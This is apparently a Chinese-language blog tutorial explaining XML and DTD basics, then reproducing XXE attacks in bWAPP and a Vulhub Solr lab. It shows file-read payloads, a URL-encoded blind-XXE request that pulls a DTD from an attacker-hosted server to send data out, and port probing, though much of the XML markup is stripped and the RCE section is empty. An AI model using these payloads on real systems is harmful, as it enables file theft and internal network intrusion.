**欢迎关注我的公众号《壳中之魂》**
# WEB安全部分
想要了解XXE，在那之前需要了解XML的相关基础
# **XML基础**
## **XML语法**
  1. 所有的XML元素都必须有一个关闭标签
  2. XML标签对大小写敏感
  3. XML必须正确嵌套
  4. XML 文档必须有根元素
  5. XML属性值必须加引号
实体引用，在标签属性，以及对应的位置值可能会出现<>符号，但是这些符号在对应的XML中都是有特殊含义的，这时候我们必须使用对应html的实体对应的表示，比如符号对应的实体就是&gt
在XML中，空格会被保留，如：`a空格B`，这时候a和B之间的空格就会被保留
## **XML结构**
### XML文档声明
``
### 元素
元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。
    body text in between
    some message in between
空元素有例如：hr、br、img
### 属性
属性可提供有关元素的额外信息
``  
其中，src为属性
### 实体
参考文章：[(38条消息) XML中实体的概念_janchin的专栏-CSDN博客_xml实体](https://blog.csdn.net/janchin/article/details/46849209%22%20/h)
实体分为四种类型，分别为：
  * 字符实体
  * 命名实体
  * 外部实体
  * 参数实体
## **文档类型定义--DTD**
DTD是用来规范XML文档格式，既可以用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体
DTD可以嵌入XML文档当中（内部声明），也可以以单独的文件存放（外部引用）
参考文章：[DTD 简介
(w3school.com.cn)](https://www.w3school.com.cn/dtd/dtd_intro.asp%22%20/h)
### **DTD内部声明**
假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：
``
内部声明DTD示例
    ]>
      George
      John
      Reminder
      Don't forget the meeting!
以上 DTD 解释如下：
  * !DOCTYPE note (第二行)定义此文档是 note 类型的文档。
  * !ELEMENT note (第三行)定义 note 元素有四个元素："to、from、heading,、body"
  * !ELEMENT to (第四行)定义 to 元素为 "#PCDATA" 类型
  * !ELEMENT from (第五行)定义 from 元素为 "#PCDATA" 类型
  * !ELEMENT heading (第六行)定义 heading 元素为 "#PCDATA" 类型
  * !ELEMENT body (第七行)定义 body 元素为 "#PCDATA" 类型
### **DTD外部引用**
假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：
``
这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD:
    George
    John
    Reminder
    Don't forget the meeting!
note.dtd：
### **PCDATA**
PCDATA 的意思是被解析的字符数据（parsed character data）。
PCDATA
是会被解析器解析的文本。这些文本将被解析器检查实体以及标记，文本中的标签会被当作标记来处理，而实体会被展开，值得注意的是，PCDATA不应包含&、字符，需要用&
实体替换，又或者是使用CDATA
### **CDATA**
CDATA 的意思是字符数据（character data）。
CDATA 是不会被解析器解析的文本。
在XML中&、字符串，也不能嵌套CDATA，结尾的]]>字符串不能包含任何的空格和换行  
### **DTD实体**
参考文章：[DTD - 实体
(w3school.com.cn)](https://www.w3school.com.cn/dtd/dtd_entities.asp%22%20/h)
DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。
实体又分为一般实体和参数实体
1，一般实体的声明语法:
引用实体的方式：&实体名；
2，参数实体只能在DTD中使用，参数实体的声明格式：
引用实体的方式：%实体名；
**内部实体**
    &writer;©right;
**外部实体**
外部实体，用来引入外部资源。有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机
    &writer;©right;
不同程序支持的协议不同
LIBXML2 | PHP | JAVA | .NET  
---|---|---|---  
file | file | http | file  
http | http | https | http  
ftp | ftp | ftp | https  
| php | file | ftp  
| compress.zlib | jar |  
| compress.bzip2 | netdoc |  
| data | mailto |  
| glob | gopher * |  
| phar |  
其中php支持的协议会更多一些，但需要一定的扩展支持。  
# **XXE**
XXE即XML外部实体注入，由上面可知，外部实体指的就是DTD外部实体，而造成XXE的原因是在解析XML的时候，对恶意的外部实体进行解析导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害
如何判断
## **如何判断是否存在XXE**
以bwapp靶场为例
首先查看http头，观察是否有XML相关字符串
再判断是否解析了XML内容
发现修改内容后服务器回解析相应的内容
## **XXE可导致的危害**
### **读取文件**
最主要使用的是使用XXE来读取文件，这里我使用bwapp靶场作为环境
_我搭建环境的时候使用php版本为5.2.17的环境，我是使用phpstudy搭建的环境，如果php版本大于5.2.17或者使用docker环境(php版本为5.5.9)会导致没有回显，当然可能只是我的环境问题，但是如果以low难度进行注入时使用正确的payload都是显示An
error occured!的话，可以尝试使用我的方法_
**有回显**
首先先进入XXE漏洞的测试界面
进行抓包，发现存在text/xml
通过修改数据，观察服务器是否会解析XML的内容
确定服务器会解析XML内容，就可以自己构造注入了
    ]>
    &bee;Any bugs?
XML的外部实体“bee”被赋予的值为：file:///d:/robots.txt，当解析xml文档时，bee会被替换为file:///d:/robots.txt的内容。就被执行回显回来了。
**无回显(Blind XXE)**
但是在实际环境中XML大多数时候并非是为了输出用，所以很多时候是不会有输出的，这样即使XML被解析了但是是无法直接读取文件的，所以我们需要外带数据，把数据发送出来读取
靶场环境：[Vulhub - Docker-Compose file for vulnerability
environment](https://vulhub.org/#/environments/solr/CVE-2017-12629-XXE/%22%20/h)
搭建好环境后先进入此页面[http://192.168.3.25:8983/solr/#/demo/query](http://192.168.3.25:8983/solr/#/demo/query%22%20/h)，然后点击提交，进行抓包，并把包发送到重放器
在本地主机（使用桥接）或者是云服务器，反正能让目标服务器连接到的ip的主机即可，在此服务器上创建dtd文件
    ">
创建完后修改包内的payload
`/solr/demo/select?\_=1641268411205&q=%25send%3b%25dtd%3b]>%26data%3b&wt=xml&defType=xmlparser`
该payload解码后为
`%send;%dtd;]>&data;&wt=xml&defType=xmlparser`  
注意，[http://192.168.3.35/xxe.dtd这句需要改为自己的地址，同时发包的时候不要把&wt=xml&defType=xmlparser进行url编码，直接复制上去就好了](http://192.168.3.35/xxe.dtd这句需要改为自己的地址，同时发包的时候不要把&wt=xml&defType=xmlparser进行url编码，直接复制上去就好了)
以上情况是当php报错时将里面的数据，如果php没有报错则使用下面的方法
首先先监听端口，然后在上面的基础上修改一下dtd文件
    ">
在连接后面附上监听的端口，发送后会在监听处收到信息，如果没有可以尝试查看服务器日志
这里用一下别人的图
参考链接：[XXE漏洞详解——进阶篇 -FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/256728.html%22%20/h)
但是我这里复现没有成功，也有可能是直接通过报错读出文件的原因，但是还是记录一下这种情况
**读取PHP等文件**
由于一些文件，如php文件内含有
    ]>
    &bee;Any bugs?
**端口探测**
同样使用bwapp靶场作为环境
前面的流程基本一致，抓包后构造注入
在http连接后跟端口，如果端口开启，则会显示 failed to open stream: HTTP request
failed!，否则不显示（或者显示failed to open stream: Connection refuse!或500状态码）
我这里使用phpstudy作为环境，所以开启了3306端口
    ]>
测试666端口，机器没有开启，所以在发送包后获取响应包需要很长一段时间，最后报500错误码
测试1234端口，本机同样为开启，也是等待了一小会才获取到的响应包
**远程命令执行RCE**